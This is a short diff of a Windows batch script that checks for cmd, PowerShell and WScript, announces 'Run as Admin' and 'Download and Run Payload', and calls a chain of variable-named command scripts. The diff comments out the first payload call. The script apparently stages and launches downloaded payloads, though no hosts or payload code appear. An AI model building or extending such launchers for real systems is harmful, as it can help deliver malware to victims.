@@ -52,7 +52,7 @@ echo Check Integrity...
 rem
 if not exist %CMDSPATH% echo "%CMDSPATH% not Exist" && exit /b 1
 if not exist %PWSHSPATH% echo "%PWSHSPATH% not Exist" && exit /b 1
-rem if not exist %WPOSHEXE% echo "%WPOSHEXE% not Exist" && exit /b 1
+if not exist %WPOSHEXE% echo "%WPOSHEXE% not Exist" && exit /b 1
 if not exist %WSCRIPTEXE% echo "%WSCRIPTEXE% not Exist" && exit /b 1
 if not exist %COMSPEC% echo "%COMSPEC% not Exist" && exit /b 1
 if not exist %CMDSPATH%\%ACMD00% echo "%CMDSPATH%\%ACMD00% not Exist" && exit /b 2
@@ -97,7 +97,7 @@ echo Run as Admin...
 echo Download and Run Payload..
 rem
 
-call %CMDSPATH%\%ACMD00%
+rem call %CMDSPATH%\%ACMD00%
 call %CMDSPATH%\%ACMD01%
 call %CMDSPATH%\%ACMD02%
 call %CMDSPATH%\%ACMD03%
